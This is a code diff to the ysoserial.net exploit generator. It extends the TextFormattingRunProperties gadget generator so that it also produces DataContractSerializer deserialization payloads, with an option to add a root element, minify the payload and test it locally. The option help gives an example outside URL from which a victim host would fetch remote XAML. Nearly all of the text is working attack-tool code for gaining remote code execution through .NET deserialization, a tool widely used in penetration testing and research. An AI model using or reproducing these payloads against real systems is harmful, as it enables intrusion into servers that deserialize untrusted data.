@@ -32,6 +32,7 @@ namespace ysoserial.Generators
     class TextFormattingRunPropertiesGenerator : GenericGenerator
     {
         private string xaml_url = "";
+        private bool hasRootDCS = false;
 
         public override string Name()
         {
@@ -48,6 +49,11 @@ namespace ysoserial.Generators
             return "Oleksandr Mirosh and Alvaro Munoz";
         }
 
+        public override string Contributors()
+        {
+            return "Oleksandr Mirosh, Alvaro Munoz, Soroush Dalili";
+        }
+
         public override List<string> Labels()
         {
             return new List<string> { GadgetTypes.NotBridgeButDervied };
@@ -55,14 +61,15 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
+            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter", "DataContractSerializer" };
         }
 
         public override OptionSet Options()
         {
             OptionSet options = new OptionSet()
             {                
-                {"xamlurl=", "This is to create a very short paylaod when affected box can read the target XAML URL (can be a file path on a shared drive or the local system). This is used by the 3rd XAML payload of ObjectDataProvider which is a ResourceDictionary with the Source parameter. Command parameter will be ignored. The shorter the better!", v => xaml_url = v },
+                {"xamlurl=", "This is to create a very short paylaod when affected box can read the target XAML URL e.g. \"http://b8.ee/x\" (can be a file path on a shared drive or the local system). This is used by the 3rd XAML payload of ObjectDataProvider which is a ResourceDictionary with the Source parameter. Command parameter will be ignored. The shorter the better!", v => xaml_url = v },
+                {"hasRootDCS", "To include a root element with the DataContractSerializer payload.", v => hasRootDCS = v != null },
             };
 
             return options;
@@ -132,7 +139,61 @@ namespace ysoserial.Generators
                 inputArgs.ExtraInternalArguments = new List<String> { "--variant", "3", "--xamlurl", xaml_url};
             }
 
-            return Serialize(TextFormattingRunPropertiesGadget(inputArgs), formatter, inputArgs);
+            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
+                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
+                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase)
+                || formatter.Equals("SoapFormatter", StringComparison.OrdinalIgnoreCase)
+                || formatter.Equals("NetDataContractSerializer", StringComparison.OrdinalIgnoreCase))
+            {
+                return Serialize(TextFormattingRunPropertiesGadget(inputArgs), formatter, inputArgs);
+            }
+            else if (formatter.ToLower().Equals("DataContractSerializer", StringComparison.OrdinalIgnoreCase))
+            {
+                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
+
+                string payload = "";
+
+                if (hasRootDCS)
+                {
+                    payload = SerializersHelper.DataContractSerializer_Marshal_2_MainType(SerializersHelper.DataContractSerializer_serialize(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs)), "root", "type", typeof(TextFormattingRunProperties));
+                }
+                else
+                {
+                    payload = SerializersHelper.DataContractSerializer_Marshal_2_MainType(SerializersHelper.DataContractSerializer_serialize(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs)));
+                }
+                
+
+                if (inputArgs.Minify)
+                {
+                    payload = XMLMinifier.Minify(payload, null, null, FormatterType.DataContractXML, true);
+                }
+
+                if (inputArgs.Test)
+                {
+                    try
+                    {
+                        if (hasRootDCS)
+                        {
+                            SerializersHelper.DataContractSerializer_deserialize(payload, "", "root", "type");
+                        }
+                        else
+                        {
+                            SerializersHelper.DataContractSerializer_deserialize(payload, typeof(TextFormattingRunProperties));
+                        }
+                    }
+                    catch (Exception err)
+                    {
+                        Debugging.ShowErrors(inputArgs, err);
+                    }
+                }
+
+                return payload;
+            }
+            else
+            {
+                throw new Exception("Formatter not supported");
+            }
+                
         }
 
         /* this can be used easily by the plugins as well */
